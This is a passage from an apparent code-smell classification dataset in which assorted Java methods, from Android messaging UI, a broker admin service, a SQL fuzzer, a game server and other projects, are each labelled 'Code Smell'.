    int firstDisappearingIndex=-resultSearchFirst - 2;
    int edge;
    if (mReversedFlow) {
      edge=mProvider.getEdge(firstPos);
    }
 else {
      edge=mProvider.getEdge(firstPos);
    }
    for (int i=firstDisappearingIndex; i >= 0; i--) {
      int disappearingIndex=positions[i];
      int disappearingRow=positionToRow.get(disappearingIndex);
      if (disappearingRow < 0) {
        disappearingRow=0;
      }
      int size=mProvider.createItem(disappearingIndex,false,mTmpItem,true);
      if (mReversedFlow) {
        edge=edge + mSpacing + size;
      }
 else {
        edge=edge - mSpacing - size;
      }
      mProvider.addItem(mTmpItem[0],disappearingIndex,size,disappearingRow,edge);
    }
  }
}",1,Code Smell
"@RequiresApi(api=Build.VERSION_CODES.LOLLIPOP) @Override public void onPermissionRequest(PermissionRequest request){
  if (lastPermissionsDialog != null) {
    lastPermissionsDialog.dismiss();
    lastPermissionsDialog=null;
  }
  String[] resources=request.getResources();
  if (resources.length == 1) {
    String resource=resources[0];
    if (parentActivity == null) {
      request.deny();
      return;
    }
switch (resource) {
case PermissionRequest.RESOURCE_AUDIO_CAPTURE:
{
        lastPermissionsDialog=AlertsCreator.createWebViewPermissionsRequestDialog(parentActivity,resourcesProvider,new String[]{Manifest.permission.RECORD_AUDIO},R.raw.permission_request_microphone,LocaleController.formatString(R.string.BotWebViewRequestMicrophonePermission,UserObject.getUserName(botUser)),LocaleController.formatString(R.string.BotWebViewRequestMicrophonePermissionWithHint,UserObject.getUserName(botUser)),allow -> {
          if (lastPermissionsDialog != null) {
            lastPermissionsDialog=null;
            if (allow) {
              runWithPermissions(new String[]{Manifest.permission.RECORD_AUDIO},allowSystem -> {
                if (allowSystem) {
                  request.grant(new String[]{resource});
                  hasUserPermissions=true;
                }
 else {
                  request.deny();
                }
              }
);
            }
 else {
              request.deny();
            }
          }
        }
);
        lastPermissionsDialog.show();
        break;
      }
case PermissionRequest.RESOURCE_VIDEO_CAPTURE:
{
      lastPermissionsDialog=AlertsCreator.createWebViewPermissionsRequestDialog(parentActivity,resourcesProvider,new String[]{Manifest.permission.CAMERA},R.raw.permission_request_camera,LocaleController.formatString(R.string.BotWebViewRequestCameraPermission,UserObject.getUserName(botUser)),LocaleController.formatString(R.string.BotWebViewRequestCameraPermissionWithHint,UserObject.getUserName(botUser)),allow -> {
        if (lastPermissionsDialog != null) {
          lastPermissionsDialog=null;
          if (allow) {
            runWithPermissions(new String[]{Manifest.permission.CAMERA},allowSystem -> {
              if (allowSystem) {
                request.grant(new String[]{resource});
                hasUserPermissions=true;
              }
 else {
                request.deny();
              }
            }
);
          }
 else {
            request.deny();
          }
        }
      }
);
      lastPermissionsDialog.show();
      break;
    }
}
}
}",1,Code Smell
"public static void loadLibs(){
  if (notLoadAgain) {
    return;
  }
  if (!(com.sunnyweather.android.flame.tv.cjump.jni.DeviceUtils.isRealARMArch() || DeviceUtils.isRealX86Arch())) {
    notLoadAgain=true;
    nativeLibLoaded=false;
    return;
  }
  if (nativeLibLoaded) {
    return;
  }
  try {
    if (android.os.Build.VERSION.SDK_INT >= 11 && android.os.Build.VERSION.SDK_INT < 23) {
      System.loadLibrary(""ndkbitmap"");
      nativeLibLoaded=true;
    }
 else {
      notLoadAgain=true;
      nativeLibLoaded=false;
    }
  }
 catch (  Exception e) {
    e.printStackTrace();
    notLoadAgain=true;
    nativeLibLoaded=false;
  }
catch (  Error e) {
    e.printStackTrace();
    notLoadAgain=true;
    nativeLibLoaded=false;
  }
  if (nativeLibLoaded) {
    boolean libInit=init();
    if (!libInit) {
      release();
      notLoadAgain=true;
      nativeLibLoaded=false;
    }
 else {
      initField();
      boolean confirm=testLib();
      if (!confirm) {
        release();
        notLoadAgain=true;
        nativeLibLoaded=false;
      }
    }
  }
  Log.e(""NativeBitmapFactory"",""loaded"" + nativeLibLoaded);
}",1,Code Smell
"/** 
 * Query topic info
 * @param req       Http Servlet Request
 * @param sBuffer   string buffer
 * @param result    process result
 * @return    process result
 */
private StringBuilder innQueryTopicConfAndRunInfo(HttpServletRequest req,StringBuilder sBuffer,ProcessResult result,boolean isNewVer){
  TopicDeployEntity qryEntity=new TopicDeployEntity();
  if (!WebParameterUtils.getQueriedOperateInfo(req,qryEntity,sBuffer,result)) {
    WebParameterUtils.buildFailResult(sBuffer,result.getErrMsg());
    return sBuffer;
  }
  if (!WebParameterUtils.getStringParamValue(req,WebFieldDef.COMPSTOPICNAME,false,null,sBuffer,result)) {
    WebParameterUtils.buildFailResult(sBuffer,result.getErrMsg());
    return sBuffer;
  }
  final Set<String> topicNameSet=(Set<String>)result.getRetData();
  if (!WebParameterUtils.getIntParamValue(req,WebFieldDef.COMPSBROKERID,false,sBuffer,result)) {
    WebParameterUtils.buildFailResult(sBuffer,result.getErrMsg());
    return sBuffer;
  }
  final Set<Integer> brokerIdSet=(Set<Integer>)result.getRetData();
  if (!WebParameterUtils.getIntParamValue(req,WebFieldDef.BROKERPORT,false,TBaseConstants.META_VALUE_UNDEFINED,1,sBuffer,result)) {
    WebParameterUtils.buildFailResult(sBuffer,result.getErrMsg());
    return sBuffer;
  }
  final int brokerPort=(int)result.getRetData();
  if (!WebParameterUtils.getTopicPropInfo(req,null,sBuffer,result)) {
    WebParameterUtils.buildFailResult(sBuffer,result.getErrMsg());
    return sBuffer;
  }
  TopicPropGroup topicProps=(TopicPropGroup)result.getRetData();
  if (!WebParameterUtils.getBooleanParamValue(req,WebFieldDef.WITHGROUPAUTHINFO,false,false,sBuffer,result)) {
    WebParameterUtils.buildFailResult(sBuffer,result.getErrMsg());
    return sBuffer;
  }
  Boolean withGroupAuthInfo=(Boolean)result.getRetData();
  if (!WebParameterUtils.getTopicStatusParamValue(req,false,TopicStatus.STATUS_TOPIC_UNDEFINED,sBuffer,result)) {
    WebParameterUtils.buildFailResult(sBuffer,result.getErrMsg());
    return sBuffer;
  }
  TopicStatus topicStatus=(TopicStatus)result.getRetData();
  qryEntity.updModifyInfo(qryEntity.getDataVerId(),TBaseConstants.META_VALUE_UNDEFINED,brokerPort,null,topicStatus,topicProps);
  Map<String,List<TopicDeployEntity>> topicDeployInfoMap=defMetaDataService.getTopicDeployInfoMap(topicNameSet,brokerIdSet,qryEntity);
  if (isNewVer) {
    return buildNewQueryResult(withGroupAuthInfo,sBuffer,topicDeployInfoMap);
  }
 else {
    return buildOldQueryResult(sBuffer,topicDeployInfoMap);
  }
}",1,Code Smell
"@DexDeobfs(CDialogUtil.class) public static CustomDialog create(Context ctx){
  try {
    if (clz_DialogUtil == null) {
      clz_DialogUtil=DexKit.loadClassFromCache(CDialogUtil.INSTANCE);
    }
    if (clz_CustomDialog == null) {
      clz_CustomDialog=load(""com/tencent/mobileqq/utils/QQCustomDialog"");
      if (clz_CustomDialog == null) {
        Class clz_Lite=load(""com/dataline/activities/LiteActivity"");
        Field[] fs=clz_Lite.getDeclaredFields();
        for (        Field f : fs) {
          if (Modifier.isPrivate(f.getModifiers()) && Dialog.class.isAssignableFrom(f.getType())) {
            clz_CustomDialog=f.getType();
            break;
          }
        }
      }
    }
    if (m_DialogUtil_a == null) {
      Method tmpa=null, tmpb=null;
      for (      Method m : clz_DialogUtil.getDeclaredMethods()) {
        if (m.getReturnType().equals(clz_CustomDialog) && (Modifier.isPublic(m.getModifiers()))) {
          Class<?>[] argt=m.getParameterTypes();
          if (argt.length != 2) {
            continue;
          }
          if (argt[0].equals(Context.class) && argt[1].equals(int.class)) {
            if (m.getName().equals(""a"")) {
              m_DialogUtil_a=m;
              break;
            }
 else {
              if (tmpa == null) {
                tmpa=m;
              }
 else {
                tmpb=m;
                break;
              }
            }
          }
        }
      }
      if (m_DialogUtil_a == null && tmpa != null) {
        if (tmpb == null) {
          m_DialogUtil_a=tmpa;
        }
 else {
          m_DialogUtil_a=(Reflex.strcmp(tmpa.getName(),tmpb.getName()) > 0) ? tmpb : tmpa;
        }
      }
    }
  }
 catch (  Exception e) {
    Log.e(e);
  }
  CustomDialog ref=new CustomDialog();
  try {
    ref.mDialog=(Dialog)m_DialogUtil_a.invoke(null,ctx,230);
  }
 catch (  Exception e) {
    Log.e(e);
  }
  if (ref.mDialog == null) {
    ref.failsafe=true;
    ref.mBuilder=new androidx.appcompat.app.AlertDialog.Builder(CommonContextWrapper.createAppCompatContext(ctx));
  }
  return ref;
}
public Dialog create(){
  if (!failsafe) {
    return mDialog;
  }
 else {
    if (mFailsafeDialog == null) {
      mFailsafeDialog=mBuilder.create();
    }
    return mFailsafeDialog;
  }
}",1,Code Smell
"public static void transformGrouped(ASTParser t,Map<PatchShaderType,TranslationUnit> trees,Parameters parameters){
  ShaderType prevType=null;
  final Object2IntMap<String>[] lastMap=new Object2IntMap[]{null};
  for (  ShaderType type : pipeline) {
    PatchShaderType[] patchTypes=PatchShaderType.fromGlShaderType(type);
    boolean hasAny=false;
    for (    PatchShaderType currentType : patchTypes) {
      if (trees.get(currentType) != null) {
        hasAny=true;
      }
    }
    if (!hasAny) {
      continue;
    }
    TranslationUnit currentTree=trees.get(patchTypes[0]);
    if (currentTree == null) {
      continue;
    }
    Root currentRoot=currentTree.getRoot();
    currentRoot.indexBuildSession((root) -> {
      if (root != null) {
        if (lastMap[0] != null) {
          transformIn(lastMap[0],t,currentTree,root,parameters);
        }
        lastMap[0]=transformOut(t,currentTree,root,parameters);
      }
    }
);
  }
}",1,Code Smell
"@Override public void draw(Canvas canvas,int width,int height,float dpi,int xpos,int ypos){
  if (xs == null) {
    xs=new float[50000];
    ys=new float[50000];
    dx=new float[50000];
    dy=new float[50000];
    phases=new int[50000];
    Random random=new Random();
    for (int i=0; i < 50000; ++i) {
      xs[i]=random.nextFloat() * (width - 32);
      ys[i]=random.nextFloat() * (height - 32);
      dx[i]=(random.nextFloat() - 0.5f) * 6f;
      dy[i]=(random.nextFloat() - 0.5f) * 6f;
      phases[i]=random.nextInt(4);
    }
  }
  boolean updatePhase=System.currentTimeMillis() - lastPhaseChange > 300;
  if (updatePhase)   lastPhaseChange=System.currentTimeMillis();
  for (int i=0; i < 50000; ++i) {
    if (""One image"".equals(_variants[_variantIdx])) {
      int image=i % 14;
      canvas.drawImageRect(all,Rect.makeXYWH(32 * phases[i],image * 32,32,32),Rect.makeXYWH(xs[i],ys[i],32,32),SamplingMode.DEFAULT,null,true);
    }
 else {
      int image=(int)Math.ceil(14 * i / 50000);
      canvas.drawImageRect(sprites[image],Rect.makeXYWH(32 * phases[i],0,32,32),Rect.makeXYWH(xs[i],ys[i],32,32),SamplingMode.DEFAULT,null,true);
    }
    if (updatePhase)     phases[i]=(phases[i] + 1) % 4;
    if (xs[i] + dx[i] + 32 >= width && dx[i] > 0)     dx[i]=-dx[i];
    if (xs[i] + dx[i] <= 0 && dx[i] < 0)     dx[i]=-dx[i];
    xs[i]=xs[i] + dx[i];
    if (ys[i] + dy[i] + 32 >= height && dy[i] > 0)     dy[i]=-dy[i];
    if (ys[i] + dy[i] <= 0 && dy[i] < 0)     dy[i]=-dy[i];
    ys[i]=ys[i] + dy[i];
  }
}",1,Code Smell
"public void onShow(Runnable dismiss){
  if (listStateId != null) {
    Parcelable state=listStates.get(listStateId);
    if (state != null) {
    }
  }
  this.dismiss=dismiss;
  if (!drawBackground) {
    checkScroll();
    for (int i=0; i < emojiGridView.getChildCount(); ++i) {
      View child=emojiGridView.getChildAt(i);
      child.setScaleX(1);
      child.setScaleY(1);
    }
    return;
  }
  if (showAnimator != null) {
    showAnimator.cancel();
    showAnimator=null;
  }
  if (hideAnimator != null) {
    hideAnimator.cancel();
    hideAnimator=null;
  }
  boolean animated=type != TYPE_TOPIC_ICON && type != TYPE_AVATAR_CONSTRUCTOR;
  if (animated) {
    showAnimator=ValueAnimator.ofFloat(0,1);
    showAnimator.addUpdateListener(anm -> {
      final float t=(float)anm.getAnimatedValue();
      updateShow(t);
    }
);
    showAnimator.addListener(new AnimatorListenerAdapter(){
      @Override public void onAnimationEnd(      Animator animation){
        NotificationCenter.getGlobalInstance().postNotificationName(NotificationCenter.startAllHeavyOperations,512);
        NotificationCenter.getGlobalInstance().onAnimationFinish(animationIndex);
        AndroidUtilities.runOnUIThread(NotificationCenter.getGlobalInstance()::runDelayedNotifications);
        checkScroll();
        updateShow(1);
        for (int i=0; i < emojiGridView.getChildCount(); ++i) {
          View child=emojiGridView.getChildAt(i);
          child.setScaleX(1);
          child.setScaleY(1);
        }
        for (int i=0; i < emojiTabs.contentView.getChildCount(); ++i) {
          View child=emojiTabs.contentView.getChildAt(i);
          child.setScaleX(1);
          child.setScaleY(1);
        }
        emojiTabs.contentView.invalidate();
      }
    }
);
    updateShow(0);
    showAnimator.setDuration(showDuration);
    NotificationCenter.getGlobalInstance().postNotificationName(NotificationCenter.stopAllHeavyOperations,512);
    animationIndex=NotificationCenter.getGlobalInstance().setAnimationInProgress(animationIndex,null);
    showAnimator.start();
  }
 else {
    checkScroll();
    updateShow(1);
  }
}",1,Code Smell
"public SQLQueryAdapter getQuery(){
  StoneDBTable randomTable=globalState.getSchema().getRandomTable();
  sb.append(""DELETE"");
  if (Randomly.getBoolean()) {
    sb.append("" LOW_PRIORITY"");
  }
  if (Randomly.getBoolean()) {
    sb.append("" QUICK"");
  }
  if (Randomly.getBoolean()) {
    sb.append("" IGNORE"");
  }
  sb.append("" FROM "");
  sb.append(randomTable.getName());
  if (globalState.getDbmsSpecificOptions().test80Version) {
    sb.append("" AS "");
    sb.append(globalState.getSchema().getFreeTableName());
  }
  if (Randomly.getBoolean()) {
    sb.append("" WHERE "");
    sb.append(StoneDBToStringVisitor.asString(new StoneDBExpressionGenerator(globalState).setColumns(randomTable.getColumns()).generateExpression()));
  }
  if (!StoneDBBugs.bug1933 && Randomly.getBoolean()) {
    sb.append("" ORDER BY "");
    sb.append(String.join("", "",Randomly.fromOptions(randomTable.getColumns().stream().map(AbstractTableColumn::getName).collect(Collectors.toList()))).replace('[','(').replace(']',')'));
  }
  if (Randomly.getBoolean()) {
    sb.append("" LIMIT "");
    sb.append(r.getInteger(0,(int)randomTable.getNrRows(globalState)));
  }
  addExpectedErrors();
  return new SQLQueryAdapter(sb.toString(),errors);
}",1,Code Smell
"public SceneBattleInfo toProto(){
  var proto=SceneBattleInfo.newInstance().setBattleId(this.getId()).setStageId(this.getStage().getId()).setRoundsLimit(this.getRoundsLimit()).setLogicRandomSeed(Utils.randomRange(1,Short.MAX_VALUE)).setWorldLevel(player.getWorldLevel());
  for (  var wave : this.getWaves()) {
    proto.addMonsterWaveList(wave.toProto());
  }
  for (int i=0; i < lineup.getAvatars().size(); i++) {
    GameAvatar avatar=getPlayer().getAvatarById(lineup.getAvatars().get(i));
    if (avatar == null)     continue;
    proto.addBattleAvatarList(avatar.toBattleProto(lineup,i));
    if (avatar.getBuffs().size() > 0) {
      for (      var buffEntry : avatar.getBuffs().int2LongEntrySet()) {
        if (buffEntry.getLongValue() < this.timestamp) {
          continue;
        }
        MazeBuff buff=this.addBuff(buffEntry.getIntKey(),i);
        if (buff != null) {
          buff.addTargetIndex(i);
        }
      }
    }
  }
  if (player.getFoodBuffs().size() > 0) {
    for (    var buff : player.getFoodBuffs().values()) {
      this.addBuff(buff.getBuffId(),-1);
    }
  }
  for (  MazeBuff buff : this.getBuffs()) {
    proto.addBuffList(buff.toProto());
  }
  if (this.battleEvents != null) {
    for (    int id : this.battleEvents) {
      var event=BattleEventBattleInfo.newInstance().setBattleEventId(id);
      event.getMutableStatus().getMutableSpBar().setCurSp(10000).setMaxSp(10000);
      proto.addEventBattleInfoList(event);
    }
  }
  if (this.battleTargets != null) {
    for (int i=1; i <= 5; i++) {
      var battleTargetList=this.battleTargets.get(i);
      var battleTargetEntry=BattleTargetInfoEntry.newInstance().setKey(i);
      if (battleTargetList == null) {
        battleTargetEntry.getMutableValue();
      }
 else {
        battleTargetEntry.setValue(battleTargetList);
      }
      proto.addBattleTargetInfo(battleTargetEntry);
    }
  }
  return proto;
}",1,Code Smell
"@Override public StreamPipeline createPipeline(){
  StreamPipeline streamPipeline=new StreamPipeline();
  if (MapUtils.isEmpty(streamTransforms)) {
    StreamNodeRelation relation=new StreamNodeRelation();
    relation.setInputNodes(streamSources.keySet());
    relation.setOutputNodes(streamSinks.keySet());
    streamPipeline.setPipeline(Lists.newArrayList(relation));
    return streamPipeline;
  }
  Map<Set<String>,List<StreamNodeRelation>> relationMap=Maps.newHashMap();
  for (  StreamTransform streamTransform : streamTransforms.values()) {
    String transformName=streamTransform.getTransformName();
    Set<String> preNodes=streamTransform.getPreNodes();
    StreamNodeRelation relation=new StreamNodeRelation();
    relation.setInputNodes(preNodes);
    relation.setOutputNodes(Sets.newHashSet(transformName));
    for (    String preNode : preNodes) {
      StreamTransform transform=streamTransforms.get(preNode);
      if (transform != null) {
        transform.addPost(transformName);
      }
    }
    relationMap.computeIfAbsent(preNodes,key -> Lists.newArrayList()).add(relation);
  }
  for (  StreamTransform streamTransform : streamTransforms.values()) {
    String transformName=streamTransform.getTransformName();
    Set<String> postNodes=streamTransform.getPostNodes();
    Set<String> sinkSet=Sets.newHashSet();
    for (    String postNode : postNodes) {
      StreamSink sink=streamSinks.get(postNode);
      if (sink != null) {
        sinkSet.add(sink.getSinkName());
      }
    }
    if (CollectionUtils.isNotEmpty(sinkSet)) {
      StreamNodeRelation relation=new StreamNodeRelation();
      Set<String> preNodes=Sets.newHashSet(transformName);
      relation.setInputNodes(preNodes);
      relation.setOutputNodes(sinkSet);
      relationMap.computeIfAbsent(preNodes,key -> Lists.newArrayList()).add(relation);
    }
  }
  List<StreamNodeRelation> relations=Lists.newArrayList();
  for (  Map.Entry<Set<String>,List<StreamNodeRelation>> entry : relationMap.entrySet()) {
    List<StreamNodeRelation> unmergedRelations=entry.getValue();
    if (unmergedRelations.size() == 1) {
      relations.add(unmergedRelations.get(0));
    }
 else {
      StreamNodeRelation mergedRelation=unmergedRelations.get(0);
      for (int index=1; index < unmergedRelations.size(); index++) {
        StreamNodeRelation unmergedRelation=unmergedRelations.get(index);
        unmergedRelation.getOutputNodes().forEach(mergedRelation::addOutputNode);
      }
      relations.add(mergedRelation);
    }
  }
  streamPipeline.setPipeline(relations);
  Pair<Boolean,Pair<String,String>> circleState=streamPipeline.hasCircle();
  if (circleState.getLeft()) {
    Pair<String,String> circleNodes=circleState.getRight();
    throw new IllegalStateException(String.format(""There is circle dependency in streamPipeline for node=%s and node=%s"",circleNodes.getLeft(),circleNodes.getRight()));
  }
  return streamPipeline;
}",1,Code Smell
"private Call getDescribeConsumerGroupsCall(ConsumerGroupOperationContext<KSGroupDescription,DescribeConsumerGroupsOptions> context){
  return new Call(""describeConsumerGroups"",context.deadline(),new ConstantNodeIdProvider(context.node().get().id())){
    @Override DescribeGroupsRequest.Builder createRequest(    int timeoutMs){
      return new DescribeGroupsRequest.Builder(new DescribeGroupsRequestData().setGroups(Collections.singletonList(context.groupId())).setIncludeAuthorizedOperations(context.options().includeAuthorizedOperations()));
    }
    @Override void handleResponse(    AbstractResponse abstractResponse){
      final DescribeGroupsResponse response=(DescribeGroupsResponse)abstractResponse;
      List<DescribedGroup> describedGroups=response.data().groups();
      if (describedGroups.isEmpty()) {
        context.future().completeExceptionally(new InvalidGroupIdException(""No consumer group found for GroupId: "" + context.groupId()));
        return;
      }
      if (describedGroups.size() > 1 || !describedGroups.get(0).groupId().equals(context.groupId())) {
        String ids=Arrays.toString(describedGroups.stream().map(DescribedGroup::groupId).toArray());
        context.future().completeExceptionally(new InvalidGroupIdException(""DescribeConsumerGroup request for GroupId: "" + context.groupId() + "" returned ""+ ids));
        return;
      }
      final DescribedGroup describedGroup=describedGroups.get(0);
      if (ConsumerGroupOperationContext.hasCoordinatorMoved(response)) {
        Call call=getDescribeConsumerGroupsCall(context);
        rescheduleFindCoordinatorTask(context,() -> call,this);
        return;
      }
      final Errors groupError=Errors.forCode(describedGroup.errorCode());
      if (handleGroupRequestError(groupError,context.future())) {
        return;
      }
      final String protocolType=describedGroup.protocolType();
      final List<KSMemberDescription> memberDescriptions=new ArrayList<>(describedGroup.members().size());
      for (      DescribedGroupMember groupMember : describedGroup.members()) {
        KSMemberBaseAssignment memberBaseAssignment=null;
        if (protocolType.equals(ConsumerProtocol.PROTOCOL_TYPE) || protocolType.isEmpty()) {
          if (groupMember.memberAssignment().length > 0) {
            final Assignment assignment=ConsumerProtocol.deserializeAssignment(ByteBuffer.wrap(groupMember.memberAssignment()));
            memberBaseAssignment=new KSMemberConsumerAssignment(new HashSet<>(assignment.partitions()));
          }
 else {
            memberBaseAssignment=new KSMemberConsumerAssignment(new HashSet<>());
          }
        }
 else {
          memberBaseAssignment=deserializeConnectGroupDataCompatibility(groupMember);
        }
        memberDescriptions.add(new KSMemberDescription(groupMember.memberId(),Optional.ofNullable(groupMember.groupInstanceId()),groupMember.clientId(),groupMember.clientHost(),memberBaseAssignment));
      }
      context.future().complete(new KSGroupDescription(context.groupId(),protocolType,memberDescriptions,describedGroup.protocolData(),ConsumerGroupState.parse(describedGroup.groupState()),context.node().get()));
    }
    @Override void handleFailure(    Throwable throwable){
      context.future().completeExceptionally(throwable);
    }
  }
;
}",1,Code Smell
"static <T extends TypeTree & Expression>T build(String fullyQualifiedName){
  return TypeTree.build(fullyQualifiedName,null);
}
static <T extends TypeTree & Expression>T build(String fullyQualifiedName,@Nullable Character escape){
  StringBuilder fullName=new StringBuilder();
  Expression expr=null;
  String nextLeftPad="""";
  StringBuilder segment=new StringBuilder();
  StringBuilder whitespaceBefore=new StringBuilder();
  StringBuilder partBuilder=new StringBuilder();
  StringBuilder whitespaceBeforeNext=new StringBuilder();
  char esc=escape != null ? escape : 0;
  boolean inEscape=false;
  for (int index=0; index < fullyQualifiedName.length(); index++) {
    char currentChar=fullyQualifiedName.charAt(index);
    if (currentChar == esc) {
      inEscape=!inEscape;
    }
    if (!inEscape && (currentChar == '.' || currentChar == '$') || index == fullyQualifiedName.length() - 1) {
      if (index == fullyQualifiedName.length() - 1) {
        segment.append(currentChar);
      }
      for (int j=0; j < segment.length(); j++) {
        char c=segment.charAt(j);
        if (escape != null && c == escape) {
          inEscape=!inEscape;
        }
        if (!Character.isWhitespace(c) || inEscape) {
          partBuilder.append(c);
        }
 else {
          if (partBuilder.length() == 0) {
            whitespaceBefore.append(c);
          }
 else {
            whitespaceBeforeNext.append(c);
          }
        }
      }
      String part=partBuilder.toString();
      Markers markers=Markers.EMPTY;
      if (escape != null && part.charAt(0) == esc && part.charAt(part.length() - 1) == esc) {
        part=part.substring(1,part.length() - 1);
        markers=markers.addIfAbsent(new Quoted(randomId()));
      }
      Space whitespaceBeforeStr=Space.format(whitespaceBefore.toString());
      if (fullName.length() == 0) {
        fullName.append(part);
        expr=new Identifier(randomId(),whitespaceBeforeStr,markers,emptyList(),part,null,null);
      }
 else {
        fullName.append('.').append(part);
        expr=new J.FieldAccess(randomId(),Space.EMPTY,Markers.EMPTY,expr,new JLeftPadded<>(Space.format(nextLeftPad),new Identifier(randomId(),whitespaceBeforeStr,markers,emptyList(),part,null,null),Markers.EMPTY),Character.isUpperCase(part.charAt(0)) ? JavaType.ShallowClass.build(fullName.toString()) : null);
      }
      nextLeftPad=whitespaceBeforeNext.toString();
      segment.setLength(0);
      whitespaceBefore.setLength(0);
      partBuilder.setLength(0);
      whitespaceBeforeNext.setLength(0);
    }
 else {
      segment.append(currentChar);
    }
  }
  assert expr != null;
  return (T)expr;
}",1,Code Smell
"protected void inflateCagetory(HtmlChartPlugin plugin){
  if (plugin == null)   return;
  List<Category> categories=plugin.getCategories();
  if (categories == null)   return;
  for (int i=0; i < categories.size(); i++) {
    Category category=categories.get(i);
    String categoryName=category.getName();
    Map<String,ChartPlugin> map=getChartPluginMap();
    if (category.hasNameLabel()) {
      for (      ChartPlugin chartPlugin : map.values()) {
        if (!(chartPlugin instanceof AbstractChartPlugin))         continue;
        List<Category> myCategories=chartPlugin.getCategories();
        if (myCategories == null)         continue;
        for (int j=0; j < myCategories.size(); j++) {
          Category myCategory=myCategories.get(j);
          if (myCategory != null && myCategory != category && StringUtil.isEquals(myCategory.getName(),categoryName)) {
            myCategories.set(j,category);
          }
        }
      }
    }
 else {
      for (      ChartPlugin chartPlugin : map.values()) {
        List<Category> myCategories=chartPlugin.getCategories();
        if (myCategories == null)         continue;
        Category fullCategory=null;
        for (        Category myCategory : myCategories) {
          if (myCategory != null && myCategory != category && myCategory.hasNameLabel() && StringUtil.isEquals(myCategory.getName(),categoryName)) {
            fullCategory=myCategory;
            break;
          }
        }
        if (fullCategory != null) {
          categories.set(i,fullCategory);
          break;
        }
      }
    }
  }
}",1,Code Smell
"protected void stickerDraw(Canvas canvas){
  if (containerView == null) {
    return;
  }
  canvas.save();
  float mirrorT=this.mirrorT.set(mirrored);
  canvas.scale(1 - mirrorT * 2,1f,baseSize.width / 2f,0);
  canvas.skew(0,4 * mirrorT * (1f - mirrorT)* .25f);
  final float segmentedT=this.segmentedT.set(segmented);
  if (!segmented) {
    centerImage.setAlpha(1f - segmentedT);
    centerImage.setImageCoords(0,0,(int)baseSize.width,(int)baseSize.height);
    centerImage.draw(canvas);
    if (segmentedT > 0) {
      drawSegmented(canvas);
    }
    if (segmentedImage != null) {
      canvas.saveLayerAlpha(0,0,baseSize.width,baseSize.height,0xFF,Canvas.ALL_SAVE_FLAG);
      drawSegmented(canvas);
      canvas.save();
      final long now=System.currentTimeMillis();
      if (highlightStart <= 0) {
        highlightStart=now;
      }
      final float gradientWidth=.80f * baseSize.width;
      final float highlightT=(now - highlightStart) / 1000f;
      final float translate=highlightT * (2 * gradientWidth + baseSize.width) - gradientWidth;
      if (highlightPaint == null) {
        highlightPaint=new Paint(Paint.ANTI_ALIAS_FLAG);
        highlightPaint.setXfermode(new PorterDuffXfermode(PorterDuff.Mode.SRC_IN));
        highlightGradient=new LinearGradient(0,0,gradientWidth,0,new int[]{0x00feee8c,0x66feee8c,0x66feee8c,0x00feee8c},new float[]{0,.4f,.6f,1f},Shader.TileMode.CLAMP);
        highlightGradientMatrix=new Matrix();
        highlightGradient.setLocalMatrix(highlightGradientMatrix);
        highlightPaint.setShader(highlightGradient);
      }
      highlightGradientMatrix.reset();
      highlightGradientMatrix.postTranslate(translate,0);
      highlightGradient.setLocalMatrix(highlightGradientMatrix);
      canvas.drawRect(0,0,(int)baseSize.width,(int)baseSize.height,highlightPaint);
      canvas.restore();
      canvas.restore();
      if ((highlightT > 0 || needHighlight) && highlightT < 1f) {
        needHighlight=false;
        containerView.invalidate();
      }
    }
  }
 else {
    highlightStart=-1;
    needHighlight=false;
    if (!overridenSegmented) {
      centerImage.setImageCoords(0,0,(int)baseSize.width,(int)baseSize.height);
      centerImage.setAlpha(1f);
      centerImage.draw(canvas);
    }
    drawSegmented(canvas);
  }
  canvas.restore();
}",1,Code Smell
"private List<Pair<Integer,Integer>> calcChooseSeatLevelPairList(int[][] actualSeats,List<String> chooseSeatList){
  String firstChooseSeat=chooseSeatList.get(0);
  int firstSeatX=Integer.parseInt(firstChooseSeat.substring(1));
  int firstSeatY=SEAT_Y_INT.get(firstChooseSeat.charAt(0));
  List<Pair<Integer,Integer>> chooseSeatLevelPairList=new ArrayList<>();
  chooseSeatLevelPairList.add(new Pair<>(firstSeatX,firstSeatY));
  int minLevelX=0;
  for (int i=1; i < chooseSeatList.size(); i++) {
    String chooseSeat=chooseSeatList.get(i);
    int chooseSeatX=Integer.parseInt(chooseSeat.substring(1));
    int chooseSeatY=SEAT_Y_INT.get(chooseSeat.charAt(0));
    minLevelX=Math.min(minLevelX,chooseSeatX - firstSeatX);
    chooseSeatLevelPairList.add(new Pair<>(chooseSeatX - firstSeatX,chooseSeatY - firstSeatY));
  }
  for (int i=Math.abs(minLevelX); i < 18; i++) {
    List<Pair<Integer,Integer>> sureSeatList=new ArrayList<>();
    if (actualSeats[i][firstSeatY] == 0) {
      sureSeatList.add(new Pair<>(i,firstSeatY));
      for (int j=1; j < chooseSeatList.size(); j++) {
        Pair<Integer,Integer> pair=chooseSeatLevelPairList.get(j);
        int chooseSeatX=pair.getKey();
        int chooseSeatY=pair.getValue();
        int x=i + chooseSeatX;
        if (x >= 18) {
          return Collections.emptyList();
        }
        if (actualSeats[i + chooseSeatX][firstSeatY + chooseSeatY] == 0) {
          sureSeatList.add(new Pair<>(i + chooseSeatX,firstSeatY + chooseSeatY));
        }
 else {
          break;
        }
      }
    }
    if (sureSeatList.size() == chooseSeatList.size()) {
      return sureSeatList;
    }
  }
  return Collections.emptyList();
}",1,Code Smell
"@Override public void didReceivedNotification(int id,int account,Object... args){
  if (id == NotificationCenter.chatInfoDidLoad) {
    TLRPC.ChatFull chatFull=(TLRPC.ChatFull)args[0];
    if (chatFull == null || progressDialog == null || waitingForChatId != chatFull.id) {
      return;
    }
    progressDialog.dismissUnless(350);
    progressDialog=null;
    waitingForChatId=-1;
    selectChat(chatFull.id,chatFull.participants);
  }
}
@Override public void didReceivedNotification(int id,int account,Object... args){
  if (viewPager == null) {
    return;
  }
  if (id == NotificationCenter.contactsDidLoad) {
    View[] views=viewPager.getViewPages();
    if (views[0] instanceof Page) {
      ((Page)views[0]).updateItems(true);
    }
    if (views[1] instanceof Page) {
      ((Page)views[1]).updateItems(true);
    }
  }
 else   if (id == NotificationCenter.storiesBlocklistUpdate) {
    View[] views=viewPager.getViewPages();
    for (int i=0; i < views.length; ++i) {
      if (views[i] instanceof Page) {
        Page page=(Page)views[i];
        if (page.pageType == PAGE_TYPE_BLOCKLIST) {
          page.applyBlocklist(true);
        }
 else         if (page.pageType == PAGE_TYPE_SHARE) {
          page.updateItems(true);
        }
      }
    }
  }
 else   if (id == NotificationCenter.storiesSendAsUpdate) {
    View[] views=viewPager.getViewPages();
    for (int i=0; i < views.length; ++i) {
      if (views[i] instanceof Page) {
